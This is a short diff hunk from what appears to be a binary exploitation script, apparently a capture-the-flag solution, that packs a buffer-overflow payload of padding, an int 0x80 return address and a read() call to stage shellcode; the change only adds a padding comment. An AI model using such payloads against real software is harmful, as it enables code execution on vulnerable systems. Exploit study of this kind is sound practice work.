@@ -40,7 +40,7 @@ payload = b''.join([ b'A'*rep,
     p32(len(sh)),
     p32(int_80h_rtn), # read(0, 0x08048200, len(shellcode))
     p32(write_addr),
-    p32(0)
+    p32(0) # padding to 0x80h bytes
 ])
 
 print(
